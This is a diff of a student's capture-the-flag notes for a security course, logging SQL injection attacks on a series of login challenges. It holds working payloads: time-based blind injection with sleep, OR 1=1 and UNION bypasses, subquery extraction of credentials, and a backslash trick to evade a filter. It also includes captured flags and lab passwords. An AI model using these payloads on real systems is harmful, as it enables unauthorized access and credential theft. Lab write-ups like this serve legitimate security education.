@@ -38,14 +38,57 @@ SELECT username, password FROM users WHERE username = " " " and password = " "
 
 must be WHERE password = "" and username = ""
 
-' + (IF(SUBSTR(  (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 1),1,1)='u' ,sleep(3),1))-- c
+' + (IF(SUBSTR(  (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 1),1,1)='a' ,sleep(3),1))-- c
 this worked and I enumerated the column name as username
 
 Enumerated this part of the table
 
-UID | USERNAME | PASSWORD           |
+UID | USERNAME          | PASSWORD           |
         GUEST
-        ADMIN   RKIGRJMGKLSADXCVVE
+        ASDASFSADFASAS   RKIGRJMGKLSADXCVVE
 
 The password was in clear text, I used it to login and got the flag
 COMP6443{v3_z5636887_RhjA_8psasNLcd-DX9Bs}
+
+#update this was not the way to solve this, and it is now 
+' + (SELECT username FROM users LIMIT 1 OFFSET 1)-- c
+
+
+
+Login 4:
+
+' + (SELECT password FROM users LIMIT 1 OFFSET 2) OR 1=1-- c  
+got SQLi detected.
+' this char triggers it
+a backslash breaks it \
+but two \\ works.
+Indicates that the query is probably something like 
+SELECT username,password FROM users where username = " '\" and password = "' \"
+
+The first slash breaks it because now there are three interpreted quotes. But if we also but a backslash in the password then the string being
+matched to the username is username = { \" and password = "} meaning whatever we put at the start of password can be executable i.e.
+SELECT username,password FROM users where username = " \" and password = " OR 1=1; -- c \"
+COMP6443{v4_z5636887_az7puwRzH87uMH1Fkb1b}
+
+LOGIN 5
+
+SELECT username, password FROM users WHERE username = "" and password = "" OR 1=1; -- c" Logs in but with wrong password for admin?
+
+It must be that admin has more than one password maybe?
+
+SELECT username, password FROM users WHERE username = "" OR 1=1 UNION " and password = ""
+
+I think best to try enumerate the database
+
+SELECT username, password FROM users WHERE username = "'OR (SELECT sleep(10)); -- c" and password = ""
+sleep worked.
+'OR (SELECT sleep(10)); -- c
+
+UID | USERNAME          | PASSWORD           |
+        ADMIN                  KINDA-WEAK-PASSWORD6
+
+Found another table
+ADMINISTRABLE_ROLE_AUTHORIZATIONS
+
+COMP6443{v5_z5636887_wNDdL3sOyvpASm4SofJc}
+
